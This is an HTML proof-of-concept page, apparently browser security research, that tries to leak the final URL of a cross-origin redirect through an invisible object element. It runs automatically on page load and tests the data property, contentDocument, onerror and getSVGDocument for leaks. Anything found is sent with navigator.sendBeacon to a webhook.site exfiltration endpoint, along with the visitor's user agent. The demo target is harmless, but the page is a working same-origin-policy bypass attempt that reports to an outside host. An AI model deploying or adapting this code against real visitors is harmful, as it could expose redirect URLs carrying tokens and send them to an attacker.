<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset='utf-8' />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Object-Only Leak Research - Putra Mahardika</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #080808;
            color: #00ff41;
            padding: 20px;
        }

        .container {
            border: 1px solid #00ff41;
            padding: 15px;
            box-shadow: 0 0 15px #00ff4133;
        }

        .leak-box {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff3e3e;
            padding: 10px;
            margin-top: 10px;
            color: #ff3e3e;
            font-weight: bold;
        }

        .log {
            font-size: 12px;
            margin-top: 10px;
            color: #aaa;
        }

        .target-info { color: #3498db; margin-bottom: 20px; }
    </style>
</head>

<body>
    <div class="container">
        <h2>[!] Focus Vector: HTMLObjectElement</h2>
        <div class="target-info">
            Target: <span id="target_url"></span><br>
            Exfil: <span id="exfil_url" style="font-size: 10px;"></span>
        </div>
        <div id="status">[*] Initializing Object Monitor...</div>
        <div id="display"></div>
        <div id="logs" class="log"></div>
    </div>

    <script>
        const CONFIG = {
            target: 'https://httpbin.org/redirect-to?url=https://www.google.com/&status_code=302',
            exfil: 'https://webhook.site/0d95c87e-8a54-4bb1-b4cf-964eecdb5594'
        };

        document.getElementById('target_url').innerText = CONFIG.target;
        document.getElementById('exfil_url').innerText = CONFIG.exfil;

        function report(data, detail) {
            const div = document.createElement('div');
            div.className = 'leak-box';
            div.innerText = `[LEAK] ${detail}: ${data}`;
            document.getElementById('display').prepend(div);

            navigator.sendBeacon(CONFIG.exfil, JSON.stringify({
                vector: 'Object-Element',
                type: detail,
                data: data,
                ua: navigator.userAgent
            }));
        }

        function log(msg) {
            const l = document.getElementById('logs');
            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        function runObjectExploit() {
            log("Creating Object element...");
            
            const obj = document.createElement('object');
            
            // Kita set ukuran 1x1 agar tetap ter-render oleh engine tapi gak ganggu UI
            obj.width = "1";
            obj.height = "1";
            obj.style.opacity = "0.1"; 

            // 1. Monitor Properti 'data' (Bypass Check)
            // Di beberapa versi WebKit, properti 'data' bisa ter-update otomatis ke URL final
            let checkInterval = setInterval(() => {
                try {
                    if (obj.data && obj.data !== CONFIG.target && !obj.data.startsWith('about:')) {
                        report(obj.data, "Object-Data-Property-Update");
                        clearInterval(checkInterval);
                    }
                } catch(e) {}
            }, 100);

            // 2. OnLoad Trigger
            obj.onload = () => {
                log("Object fired 'onload' event.");
                try {
                    // Mencoba akses sub-document (Akan gagal di SOP normal)
                    const leak = obj.contentDocument.location.href;
                    if(leak) report(leak, "ContentDocument-Location-Leak");
                } catch(e) {
                    log("SOP blocked contentDocument access (Normal).");
                }
            };

            // 3. OnError Trigger (Kadang pesan error bocor)
            obj.onerror = (err) => {
                log("Object fired 'onerror'.");
                // Cek jika error event membawa info source
                if(err && err.target && err.target.data !== CONFIG.target) {
                    report(err.target.data, "Error-Event-Source-Leak");
                }
            };

            // 4. SVG Document Leak (Spesifik WebKit)
            try {
                const svgDoc = obj.getSVGDocument();
                if(svgDoc) report(svgDoc.URL, "getSVGDocument-Leak");
            } catch(e) {}

            // Jalankan!
            obj.data = CONFIG.target;
            document.body.appendChild(obj);

            // Timeout untuk berhenti memantau
            setTimeout(() => {
                clearInterval(checkInterval);
                log("Monitoring finished.");
                document.getElementById('status').innerText = "[+] Done. Check Webhook.";
            }, 5000);
        }

        window.onload = () => {
            setTimeout(runObjectExploit, 1000);
        };
    </script>
</body>

</html>
